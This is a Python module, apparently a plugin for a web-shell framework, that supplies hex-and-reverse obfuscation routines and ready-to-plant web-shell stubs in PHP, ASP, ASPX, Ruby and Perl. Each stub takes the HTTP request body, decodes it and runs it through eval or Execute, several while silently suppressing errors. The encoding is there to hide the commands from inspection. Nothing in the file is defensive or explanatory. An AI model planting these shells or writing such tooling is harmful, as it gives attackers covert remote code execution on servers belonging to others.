# obfuscators/HEX_REV.py

import json
import textwrap

PARAM_SCHEM = {
    "encoding" : "utf-8"
}

dicObfuscator = {
    'PHP' : textwrap.dedent('''
        function Encrypt($data) {
            return strrev(bin2hex($data));
        }                
    ''').strip(),
    
    'ASP' : textwrap.dedent('''
        Function Encrypt(data)
            On Error Resume Next
            Dim stream, bytes, xmlDoc, node, hexStr, reversedHex, i
            
            Set stream = CreateObject("ADODB.Stream")
            stream.Type = 2 ' adTypeText
            stream.CharSet = "utf-8"
            stream.Open
            stream.WriteText data
            stream.Position = 0
            stream.Type = 1 ' adTypeBinary
            bytes = stream.Read
            stream.Close
            Set stream = Nothing
            
            Set xmlDoc = CreateObject("MSXML2.DOMDocument.3.0")
            Set node = xmlDoc.CreateElement("binary")
            node.dataType = "bin.hex"
            node.nodeTypedValue = bytes
            hexStr = LCase(node.text)
            Set node = Nothing
            Set xmlDoc = Nothing
            
            reversedHex = ""
            For i = Len(hexStr) To 1 Step -1
                reversedHex = reversedHex & Mid(hexStr, i, 1)
            Next
            
            Encrypt = reversedHex
        End Function
        ''').strip(),

    'ASPX' : textwrap.dedent('''
        function Encrypt(data : String) : String {
            var bytes = System.Text.Encoding.UTF8.GetBytes(data);
            var hex = System.BitConverter.ToString(bytes).Replace("-", "").ToLower();
            var reversedHex = hex.split("").reverse().join("");
            return reversedHex;
        }
        ''').strip(),

    'Ruby' : textwrap.dedent('''
        def Encrypt(data)
            data.unpack1("H*").reverse
        end
        ''').strip(),

    'Perl' : textwrap.dedent('''
        sub Encrypt {
            my ($data) = @_;
            my $hex = unpack("H*", $data);
            $hex = reverse($hex);
            return $hex;
        }
        ''').strip(),

}

dicPayload = {
    'PHP' : textwrap.dedent('''
        <?php
        $rawInput = file_get_contents("php://input");
        $decrypted = hex2bin(strrev($rawInput));
        eval($decrypted);
        ?>
        ''').strip(),

    'ASP' : textwrap.dedent('''
        <%
        On Error Resume Next
        Dim len, rawData, i, revHex, hexStr, cleanHex, c, plaintext
        len = Request.TotalBytes
        If len > 0 Then
            rawData = BinaryToString(Request.BinaryRead(len))
            revHex = ""
            For i = Len(rawData) To 1 Step -1
                revHex = revHex & Mid(rawData, i, 1)
            Next
            cleanHex = ""
            For i = 1 To Len(revHex)
                c = LCase(Mid(revHex, i, 1))
                If InStr("0123456789abcdef", c) > 0 Then
                    cleanHex = cleanHex & c
                End If
            Next
            
            plaintext = ""
            For i = 1 To Len(cleanHex) Step 2
                plaintext = plaintext & Chr("&H" & Mid(cleanHex, i, 2))
            Next
            
            Execute plaintext
        End If

        Function BinaryToString(Binary)
            Dim Stream
            Set Stream = CreateObject("ADODB.Stream")
            Stream.Type = 1 ' adTypeBinary
            Stream.Open
            Stream.Write Binary
            Stream.Position = 0
            Stream.Type = 2 ' adTypeText
            Stream.CharSet = "utf-8"
            BinaryToString = Stream.ReadText
            Set Stream = Nothing
        End Function
        %>
        ''').strip(),

    'ASPX' : textwrap.dedent('''
        <%@ Page Language="JScript" %>
        <%
        try {
            var inputStream = Request.InputStream;
            var len = inputStream.Length;
            if (len > 0) {
                var rawData : System.Byte[] = new System.Byte[len];
                inputStream.Read(rawData, 0, len);
                
                var rawStr : String = System.Text.Encoding.ASCII.GetString(rawData).Trim();
                var revHex : String = Server.UrlEncode(rawStr).Replace("+", "%20").ToUpper();
                var arr = revHex.ToCharArray();
                System.Array.Reverse(arr);
                var hexRaw : String = new String(arr).ToLower();
                
                var sb : System.Text.StringBuilder = new System.Text.StringBuilder();
                for (var j = 0; j < hexRaw.Length; j++) {
                    var c = hexRaw.substring(j, j + 1);
                    if ("0123456789abcdef".indexOf(c) >= 0) {
                        sb.Append(c);
                    }
                }
                
                var hex : String = sb.ToString();
                var numberChars = hex.Length;
                
                if (numberChars > 0 && numberChars % 2 == 0) {
                    var list = new System.Collections.ArrayList();
                    for (var i = 0; i < numberChars; i += 2) {
                        var hexPart : String = hex.substring(i, i + 2);
                        list.Add(System.Convert.ToByte(hexPart, 16));
                    }
                    
                    var bytes : System.Byte[] = list.ToArray(System.Type.GetType("System.Byte"));
                    var plaintext : String = System.Text.Encoding.UTF8.GetString(bytes);
                    
                    if (plaintext != "") {
                        eval(plaintext, "unsafe");
                    }
                }
            }
        } catch(err) {}
        %>
        ''').strip(),

    'Ruby' : textwrap.dedent(
        '''
        begin
            len = ENV['CONTENT_LENGTH'].to_i
            raw_input = STDIN.read(len)
            raw_input = raw_input.strip
            unless raw_input.empty?
                # strrev()
                reversed = raw_input.reverse
                # hex2bin()
                decrypted = [reversed].pack("H*")
                eval(decrypted)
            end
        rescue => e
            print "Content-Type: text/plain\\r\\n\\r\\n"
            print e.message
        end
        ''').strip(),

    'Perl' : textwrap.dedent(
        '''
        use strict;
        use warnings;

        my $len = $ENV{CONTENT_LENGTH} || 0;
        read(STDIN, my $rawInput, $len);

        $rawInput =~ s/\s+//g;

        my $reversed = reverse($rawInput);

        my $decrypted = pack("H*", $reversed);

        eval $decrypted;
        '''
        ).strip()
}

def obfuscator(payload, script, key=None, **kwargs):
    if script in dicObfuscator.keys():
        return dicObfuscator[script]
    return ''

def build(payload, script, **kwargs):
    if script in dicPayload.keys():
        return dicPayload[script]
    return ''

def available(payload, **kwargs):
    scripts = []
    for script in dicPayload.keys():
        if not script in dicObfuscator.keys():
            continue

        scripts.append(script)

    return ','.join(scripts)

def example(payload, **kwargs):
    return json.dumps(PARAM_SCHEM, indent=4)

def obfuscate(payload, encoding='utf-8', **kwargs):
    data_bytes = payload.encode(encoding) if isinstance(payload, str) else payload
    hex_str = data_bytes.hex()
    reversed_hex = hex_str[::-1]
    return reversed_hex

def deobfuscate(payload, encoding='utf-8', **kwargs):
    if isinstance(payload, bytes):
        payload = payload.decode(encoding)

    hex_str = payload[::-1]
    data_bytes = bytes.fromhex(hex_str)
    return data_bytes.decode(encoding)